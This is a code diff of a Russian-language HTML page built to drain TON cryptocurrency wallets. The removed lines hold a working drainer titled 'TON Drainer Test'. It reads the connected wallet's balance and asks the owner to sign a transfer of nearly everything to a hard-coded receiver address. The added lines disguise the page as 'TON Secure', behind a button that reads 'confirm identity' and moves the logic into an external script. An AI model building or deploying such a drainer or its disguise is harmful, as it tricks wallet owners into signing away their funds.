@@ -1,100 +1,14 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Drainer Test</title>
-    <script src="https://unpkg.com/@tonconnect/sdk@2.2.1/dist/tonconnect-sdk.min.js"></script>
-    <style>
-        body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #eee; }
-        button { padding: 10px 20px; margin: 5px; border: none; border-radius: 5px; cursor: pointer; }
-        #connectBtn { background: #4CAF50; color: white; }
-        #drainBtn { background: #f44336; color: white; }
-        #drainBtn:disabled { opacity: 0.5; cursor: not-allowed; }
-        #log { background: #0d0d1a; padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
-        .container { max-width: 600px; margin: auto; }
-    </style>
+    <title>TON Secure</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-<div class="container">
-    <h1>🔗 Подключите кошелёк</h1>
-    <button id="connectBtn">Подключить</button>
-    <button id="drainBtn" disabled>Забрать всё (TON)</button>
-    <h3>Лог:</h3>
-    <pre id="log"></pre>
-</div>
-<script>
-    // ВАШ АДРЕС ПОЛУЧАТЕЛЯ (замените)
-    const RECEIVER = 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI';
-
-    // Инициализация коннектора
-    const connector = new TonConnect({
-        manifestUrl: window.location.origin + '/manifest.json'
-    });
-
-    let walletAddress = null;
-    const logEl = document.getElementById('log');
-    const log = msg => logEl.textContent += msg + '\n';
-
-    // Кнопка подключения
-    document.getElementById('connectBtn').onclick = async () => {
-        try {
-            await connector.connect();
-        } catch (e) {
-            log('❌ Ошибка подключения: ' + e.message);
-        }
-    };
-
-    // Статус подключения
-    connector.on('statusChange', (wallet) => {
-        if (wallet) {
-            walletAddress = wallet.account.address;
-            log('✅ Подключен: ' + walletAddress);
-            document.getElementById('drainBtn').disabled = false;
-        } else {
-            walletAddress = null;
-            log('⛔ Отключен');
-            document.getElementById('drainBtn').disabled = true;
-        }
-    });
-
-    // Кнопка "забрать всё"
-    document.getElementById('drainBtn').onclick = async () => {
-        if (!walletAddress) {
-            log('⚠️ Сначала подключитесь');
-            return;
-        }
-        try {
-            log('🔍 Получение баланса...');
-            // Запрос баланса через toncenter
-            const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
-            const data = await resp.json();
-            if (!data.ok) throw new Error('Ошибка API: ' + JSON.stringify(data));
-            const balanceNano = parseInt(data.result); // в нанотоннах
-            const feeNano = 10000000; // 0.01 TON (запас)
-            if (balanceNano <= feeNano) {
-                log('⚠️ Баланс слишком мал (≤ 0.01 TON)');
-                return;
-            }
-            const amount = balanceNano - feeNano;
-            log(`💰 Баланс: ${balanceNano/1e9} TON, отправляем ${amount/1e9} TON`);
-
-            // Формируем транзакцию
-            const tx = {
-                validUntil: Math.floor(Date.now()/1000) + 600,
-                messages: [{
-                    address: RECEIVER,
-                    amount: amount.toString(),
-                    payload: '' // можно оставить пустым
-                }]
-            };
-            log('✍️ Отправка запроса на подпись...');
-            const result = await connector.sendTransaction(tx);
-            log('✅ Успешно! Хеш: ' + JSON.stringify(result));
-        } catch (e) {
-            log('❌ Ошибка: ' + e.message);
-        }
-    };
-</script>
+    <div id="ton-connect" style="margin:20px;"></div>
+    <button id="drainBtn" style="margin:20px;font-size:24px;padding:10px 30px;" disabled>Подтвердить личность</button>
+    <script src="tonsdk.js"></script>
 </body>
 </html>
